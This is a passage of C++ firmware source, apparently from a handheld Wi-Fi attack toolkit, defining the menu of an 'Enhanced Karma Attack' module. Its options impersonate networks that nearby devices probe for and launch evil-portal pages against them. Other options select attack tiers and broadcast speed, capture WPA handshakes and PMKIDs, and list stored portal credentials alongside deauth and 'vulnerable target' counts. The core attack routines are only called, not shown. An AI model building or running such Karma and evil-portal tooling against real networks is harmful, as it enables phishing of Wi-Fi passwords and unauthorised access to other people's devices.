                              delay(1000);
                          }},
                         {handshakeCaptureEnabled ? "* HS Capture" : "- HS Capture", [&]() {
                              handshakeCaptureEnabled = !handshakeCaptureEnabled;
                              displayTextLine(handshakeCaptureEnabled ? "Handshake Capture ON" : "Handshake Capture OFF");
                              delay(1000);
                          }},
                         {"Back", [&]() {}}
                     };
                     loopOptions(attackOptions);
                 }},
                {"SSID Database", [&]() {
                     std::vector<Option> dbOptions = {
                         {broadcastAttack.isActive() ? "Stop Broadcast" : "Start Broadcast", [&]() {
                              if (broadcastAttack.isActive()) {
                                  broadcastAttack.stop();
                                  if (attackConfig.enableBeaconing) {
                                      karmaMode = MODE_BROADCAST;
                                  } else {
                                      karmaMode = MODE_PASSIVE;
                                  }
                                  displayTextLine("Broadcast stopped");
                              } else {
                                  broadcastAttack.start();
                                  if (attackConfig.enableBeaconing) {
                                      karmaMode = MODE_FULL;
                                  } else {
                                      karmaMode = MODE_BROADCAST;
                                  }
                                  size_t total = SSIDDatabase::getCount();
                                  displayTextLine("Broadcast started: " + String(total) + " SSIDs");
                              }
                              delay(1000);
                          }},
                         {"Database Info", [&]() {
                              drawMainBorderWithTitle("SSID DATABASE");
                              int rowStep = LH * FP + 7;
                              int y = BORDER_PAD_Y + FM * LH;
                              tft.setTextSize(FP);
                              tft.fillRect(
                                  BORDER_PAD_X, y - LH * FP, tftWidth - 2 * BORDER_PAD_X, 3 * rowStep + LH * FP,
                                  bruceConfig.bgColor
                              );
                              size_t total = SSIDDatabase::getCount();
                              tft.setCursor(BORDER_PAD_X, y);
                              y += rowStep;
                              tft.print("Total SSIDs: " + String(total));
                              tft.setCursor(BORDER_PAD_X, y);
                              y += rowStep;
                              tft.print("Cached: streaming");
                              tft.setCursor(BORDER_PAD_X, y);
                              y += rowStep;
                              tft.print("Progress: " + broadcastAttack.getProgressString());
                              tft.setCursor(BORDER_PAD_X, tftHeight - BORDER_PAD_X - LH * FP);
                              tft.print("Sel: Back");
                              while (!check(SelPress) && !check(EscPress)) delay(50);
                          }},
                         {"Warm Cache", [&]() {
                              std::vector<String> frequent = {"Google", "AndroidAP", "iPhone", "NETGEAR"};
                              SSIDDatabase::warmCache(frequent);
                              displayTextLine("Cache warmed: " + String(SSIDDatabase::getCacheSize()));
                              delay(1000);
                          }},
                         {"Set Speed", [&]() {
                              std::vector<Option> speedOptions = {
                                  {"Fast (200ms)", [&]() {
                                       broadcastAttack.setBroadcastInterval(200);
                                       displayTextLine("Speed: Fast");
                                       delay(1000);
                                   }},
                                  {"Normal (300ms)", [&]() {
                                       broadcastAttack.setBroadcastInterval(300);
                                       displayTextLine("Speed: Normal");
                                       delay(1000);
                                   }},
                                  {"Slow (500ms)", [&]() {
                                       broadcastAttack.setBroadcastInterval(500);
                                       displayTextLine("Speed: Slow");
                                       delay(1000);
                                   }},
                                  {"Back", [&]() {}}
                              };
                              loopOptions(speedOptions);
                          }},
                         {"Back", [&]() {}}
                     };
                     loopOptions(dbOptions);
                 }},
                {"Karma Attack", [&]() {
                     std::vector<ClientBehavior> vulnerable = getVulnerableClients();
                     std::vector<ProbeRequest> uniqueProbes = getUniqueProbes();
                     if (vulnerable.empty() && uniqueProbes.empty()) {
                         displayTextLine("No targets found!");
                         delay(1000);
                         screenNeedsRedraw = true;
                         return;
                     }
                     std::vector<Option> karmaOptions;
                     
                     for (const auto &client : vulnerable) {
                         if (client.isPermanentTarget && !client.probedSSIDs.empty()) {
                             String itemText = client.lastMAC.substring(9) + " [PERM]";
                             karmaOptions.push_back({itemText.c_str(), [=, &client]() {
                                                         launchManualEvilPortal(
                                                             client.probedSSIDs[0],
                                                             client.favoriteChannel,
                                                             selectedTemplate.verifyPassword
                                                         );
                                                         screenNeedsRedraw = true;
                                                     }});
                         }
                     }
                     
                     for (const auto &client : vulnerable) {
                         if (!client.isPermanentTarget && !client.probedSSIDs.empty()) {
                             String itemText = client.lastMAC.substring(9) + " (VULN)";
                             if (client.successRate > 50) itemText += " [" + String(client.successRate, 1) + "%]";
                             karmaOptions.push_back({itemText.c_str(), [=, &client]() {
                                                         launchManualEvilPortal(
                                                             client.probedSSIDs[0],
                                                             client.favoriteChannel,
                                                             selectedTemplate.verifyPassword
                                                         );
                                                         screenNeedsRedraw = true;
                                                     }});
                         }
                     }
                     for (const auto &probe : uniqueProbes) {
                         String itemText = String(probe.ssid) + " (" + String(probe.rssi) + "|ch" +
                                           String(probe.channel) + ")";
                         if (itemText.length() > 40) itemText = itemText.substring(0, 37) + "...";
                         karmaOptions.push_back({itemText.c_str(), [=, &probe]() {
                                                     launchManualEvilPortal(
                                                         String(probe.ssid),
                                                         probe.channel,
                                                         selectedTemplate.verifyPassword
                                                     );
                                                     screenNeedsRedraw = true;
                                                 }});
                     }
                     karmaOptions.push_back({"Back", [&]() {}});
                     loopOptions(karmaOptions);
                     screenNeedsRedraw = true;
                 }},
                {"Select Template", [&]() { selectPortalTemplate(false); }},
                {"Attack Strategy", [&]() {
                     std::vector<Option> strategyOptions = {
                         {attackConfig.defaultTier == TIER_CLONE ? "* Clone Mode" : "- Clone Mode", [&]() {
                              attackConfig.defaultTier = TIER_CLONE;
                              displayTextLine("Clone mode enabled");
                              delay(1000);
                          }},
                         {attackConfig.defaultTier == TIER_HIGH ? "* High Tier" : "- High Tier", [&]() {
                              attackConfig.defaultTier = TIER_HIGH;
                              displayTextLine("High tier mode");
                              delay(1000);
                          }},
                         {attackConfig.defaultTier == TIER_MEDIUM ? "* Medium Tier" : "- Medium Tier", [&]() {
                              attackConfig.defaultTier = TIER_MEDIUM;
                              displayTextLine("Medium tier mode");
                              delay(1000);
                          }},
                         {attackConfig.defaultTier == TIER_FAST ? "* Fast Tier" : "- Fast Tier", [&]() {
                              attackConfig.defaultTier = TIER_FAST;
                              displayTextLine("Fast tier mode");
                              delay(1000);
                          }},
                         {attackConfig.enableCloneMode ? "* Clone Detection" : "- Clone Detection", [&]() {
                              attackConfig.enableCloneMode = !attackConfig.enableCloneMode;
                              displayTextLine(attackConfig.enableCloneMode ? "Clone detection ON" : "Clone detection OFF");
                              delay(1000);
                          }},
                         {attackConfig.enableTieredAttack ? "* Tiered Attack" : "- Tiered Attack", [&]() {
                              attackConfig.enableTieredAttack = !attackConfig.enableTieredAttack;
                              displayTextLine(attackConfig.enableTieredAttack ? "Tiered attack ON" : "Tiered attack OFF");
                              delay(1000);
                          }},
                         {attackConfig.enableContextualTemplate ? "* Contextual" : "- Contextual", [&]() {
                              attackConfig.enableContextualTemplate = !attackConfig.enableContextualTemplate;
                              displayTextLine(attackConfig.enableContextualTemplate ? "Contextual ON" : "Contextual OFF");
                              delay(1000);
                          }},
                         {"Back", [&]() {}}
                     };
                     loopOptions(strategyOptions);
                 }},
                {"Active Broadcast Attack", [&]() {
                     std::vector<Option> broadcastOptions;
                     broadcastOptions.push_back({broadcastAttack.isActive() ? "Stop Broadcast" : "Start Broadcast", [&]() {
                         if (broadcastAttack.isActive()) {
                             broadcastAttack.stop();
                             if (attackConfig.enableBeaconing) {
                                 karmaMode = MODE_BROADCAST;
                             } else {
                                 karmaMode = MODE_PASSIVE;
                             }
                         } else {
                             broadcastAttack.start();
                             if (attackConfig.enableBeaconing) {
                                 karmaMode = MODE_FULL;
                             } else {
                                 karmaMode = MODE_BROADCAST;
                             }
                         }
                         delay(1000);
                     }});
                     broadcastOptions.push_back({"Set Speed", [&]() {
                                                     std::vector<Option> speedOptions = {
                                                         {"Fast (200ms)",
                 [&]() {
                                                              broadcastAttack.setBroadcastInterval(200);
                                                              displayTextLine("Speed: Fast");
                                                              delay(1000);
                                                          }},
                                                         {"Normal (300ms)",
                 [&]() {
                                                              broadcastAttack.setBroadcastInterval(300);
                                                              displayTextLine("Speed: Normal");
                                                              delay(1000);
                                                          }},
                                                         {"Slow (500ms)",
                 [&]() {
                                                              broadcastAttack.setBroadcastInterval(500);
                                                              displayTextLine("Speed: Slow");
                                                              delay(1000);
                                                          }},
                                                         {"Back", [&]() {}}
                                                     };
                                                     loopOptions(speedOptions);
                                                 }});
                     broadcastOptions.push_back(
                         {"Show Stats", [&]() {
                              drawMainBorderWithTitle("BROADCAST STATS");
                              int rowStep = LH * FP + 7;
                              int y = BORDER_PAD_Y;
                              tft.setTextSize(FP);
                              size_t totalSSIDs = SSIDDatabase::getCount();
                              size_t currentPos = broadcastAttack.getCurrentPosition();
                              float progress = broadcastAttack.getProgressPercent();
                              BroadcastStats stats = broadcastAttack.getStats();

                              tft.setCursor(BORDER_PAD_X, y);
                              y += rowStep;
                              tft.print("Total SSIDs: " + String(totalSSIDs));
                              tft.setCursor(BORDER_PAD_X, y);
                              y += rowStep;
                              tft.print("Progress: " + String(progress, 1) + "%");
                              tft.setCursor(BORDER_PAD_X, y);
                              y += rowStep;
                              tft.print("Broadcasts: " + String(stats.totalBroadcasts));
                              tft.setCursor(BORDER_PAD_X, y);
                              y += rowStep;
                              tft.print("Responses: " + String(stats.totalResponses));
                              tft.setCursor(BORDER_PAD_X, y);
                              y += rowStep;
                              tft.print(
                                  "Status: " + String(broadcastAttack.isActive() ? "ACTIVE" : "INACTIVE")
                              );
                              tft.setCursor(BORDER_PAD_X, tftHeight - BORDER_PAD_X - LH * FP);
                              tft.print("Sel: Back");
                              while (!check(SelPress) && !check(EscPress)) {
                                  if (check(PrevPress)) break;
                                  delay(50);
                              }
                          }}
                     );
                     broadcastOptions.push_back({"Back", [&]() {}});
                     loopOptions(broadcastOptions);
                 }},
                {"View Captures", [&]() {
                     std::vector<Option> viewOptions = {
                         {"Portal Creds", [&]() {
                              FS *fs;
                              if (getFsStorage(fs) && fs->exists("/PortalCreds")) {
                                  loopSD(*fs, false, "TXT", "/PortalCreds");
                              } else {
                                  displayTextLine("No captures yet");
                                  delay(1000);
                              }
                          }},
                         {"Handshakes", [&]() {
                              FS *fs;
                              if (getFsStorage(fs) && fs->exists("/BrucePCAP/handshakes")) {
                                  loopSD(*fs, false, "PCAP", "/BrucePCAP/handshakes");
                              } else {
                                  displayTextLine("No handshakes yet");
                                  delay(1000);
                              }
                          }},
                         {"Back", [&]() {}}
                     };
                     loopOptions(viewOptions);
                 }},
                {"Save Probes", [&]() {
                     FS *saveFs;
                     if (getFsStorage(saveFs) && storageAvailable) {
                         saveProbesToFile(*saveFs, true);
                         displayTextLine("Probes saved!");
                     } else displayTextLine("No storage!");
                     delay(1000);
                 }},
                {"Clear Probes", [&]() {
                     clearProbes();
                     displayTextLine("Probes cleared!");
                     delay(1000);
                 }},
                {"Show Stats", [&]() {
                     drawMainBorderWithTitle("KARMA STATS");
                     int y = BORDER_PAD_Y;
                     tft.setTextSize(FP);
                     tft.setCursor(BORDER_PAD_X, y);
                     padprint("Probes: " + String(totalProbes));
                     padprintln("Uniq Clients: " + String(uniqueClients), 11);
                     padprint("Responses: " + String(karmaResponsesSent));
                     padprintln("Portals: " + String(autoPortalsLaunched), 11);
                     padprint("Clone Atks: " + String(cloneAttacksLaunched));
                     padprintln("Deauth Pkt: " + String(deauthPacketsSent), 11);
                     int vulnCount = 0;
                     int permCount = 0;
                     for (const auto &clientPair : clientBehaviors) {
                         if (clientPair.second.isVulnerable) vulnCount++;
                         if (clientPair.second.isPermanentTarget) permCount++;
                     }
                     padprint("Vulnerable: " + String(vulnCount));
                     padprintln("Perm Targets: " + String(permCount), 11);
                     padprint("Act Portal: " + String(activePortalCount()));
                     padprintln("PMKID Capt: " + String(pmkidCaptured), 11);
                     padprint("Handshakes: " + String(handshakeBuffer.size()));
                     padprintln("Rate Lim: " + String(targetRateLimit.size()), 11);
                     padprintln("");
                     padprintln("Sel: Back");
                     while (!check(SelPress) && !check(EscPress)) {
                         if (check(PrevPress)) break;
                         delay(50);
                     }
                     screenNeedsRedraw = true;
                 }},
                {"Exit Karma", [&]() { returnToMenu = true; }},
            };

            loopOptions(options);

            forceFullRedraw();
            drawMainBorderWithTitle("ENHANCED KARMA ATK");
            tft.setTextSize(FP);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            padprintln("Saved to " + FileSys);
            if (templateSelected) padprintln("Template: " + selectedTemplate.name);
            else padprintln("Template: None");
            padprintln("SEL/ESC: Menu | Prev/Next: Channel");

            screenNeedsRedraw = true;
            continue;
        }

        updateKarmaDisplay();
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

#endif
